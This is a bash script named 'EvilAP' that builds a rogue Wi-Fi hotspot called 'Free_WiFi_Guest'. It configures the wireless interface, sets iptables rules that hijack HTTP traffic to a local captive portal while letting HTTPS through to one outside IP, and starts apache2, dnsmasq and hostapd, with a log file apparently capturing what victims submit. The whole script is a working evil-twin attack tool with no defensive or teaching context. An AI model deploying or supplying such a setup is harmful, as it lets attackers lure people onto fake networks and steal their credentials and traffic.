#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[+] Starting EvilAP Setup${NC}"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[-] This script must be run as root${NC}"
   exit 1
fi

# Configuration
INTERFACE="wlan0"  # Change this to your wireless interface
AP_IP="192.168.45.1"
INTERNET_INTERFACE="eth0"  # Change this to your internet-connected interface
# IP del servidor real de alux.cc (reemplaza con la IP correcta si es diferente)
ALUX_CC_IP="9.169.156.105"

echo -e "${YELLOW}[*] Configuring interface ${INTERFACE}${NC}"

# Stop conflicting services
systemctl stop NetworkManager
systemctl stop wpa_supplicant

# Configure wireless interface
ifconfig $INTERFACE down
ifconfig $INTERFACE up
ifconfig $INTERFACE $AP_IP netmask 255.255.255.0

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Clear existing iptables rules
iptables -F
iptables -t nat -F
iptables -t mangle -F

echo -e "${YELLOW}[*] Setting up iptables rules${NC}"

# NAT rules for internet access (optional)
iptables -t nat -A POSTROUTING -o $INTERNET_INTERFACE -j MASQUERADE
iptables -A FORWARD -i $INTERFACE -o $INTERNET_INTERFACE -j ACCEPT
iptables -A FORWARD -i $INTERNET_INTERFACE -o $INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT

# === CAPTIVE PORTAL RULES - MODIFICADAS ===
# 1. Redirigir solo HTTP (puerto 80) al portal cautivo. Esto evita el error SSL.
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j DNAT --to-destination $AP_IP:80

# 2. PERMITIR el tráfico HTTPS (puerto 443) hacia la IP real de blog.alux.cc para que la redirección funcione.
iptables -t nat -I PREROUTING -i $INTERFACE -p tcp -d $ALUX_CC_IP --dport 443 -j ACCEPT
# También permitir HTTP por si acaso
iptables -t nat -I PREROUTING -i $INTERFACE -p tcp -d $ALUX_CC_IP --dport 80 -j ACCEPT

# 3. (Opcional) Bloquear otros intentos de HTTPS para una redirección más limpia
# iptables -A FORWARD -i $INTERFACE -p tcp --dport 443 -j DROP

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow traffic on loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow traffic on AP interface
iptables -A INPUT -i $INTERFACE -j ACCEPT
iptables -A OUTPUT -o $INTERFACE -j ACCEPT

echo -e "${YELLOW}[*] Starting services${NC}"

# Start Apache
systemctl start apache2

# Start dnsmasq (asegúrate de que tu /etc/dnsmasq.conf está configurado)
dnsmasq -C /etc/dnsmasq.conf -d &
DNSMASQ_PID=$!

# Start hostapd
hostapd /etc/hostapd/hostapd.conf -B

echo -e "${GREEN}[+] EvilAP is now running!${NC}"
echo -e "${GREEN}[+] SSID: Free_WiFi_Guest${NC}"
echo -e "${GREEN}[+] Portal IP: http://${AP_IP}${NC}"
echo -e "${GREEN}[+] Check logs: tail -f /var/log/captive_portal.log${NC}"
echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"

# Keep script running
trap 'echo -e "\n${YELLOW}[*] Stopping EvilAP...${NC}"; kill $DNSMASQ_PID; 
systemctl stop hostapd; systemctl stop apache2; iptables -F; iptables -t nat -F; 
echo -e "${GREEN}[+] EvilAP stopped${NC}"; exit 0' INT

# Wait for interrupt
while true; do
    sleep 60
    echo -e "${GREEN}[+] EvilAP running... ($(date))${NC}"
done
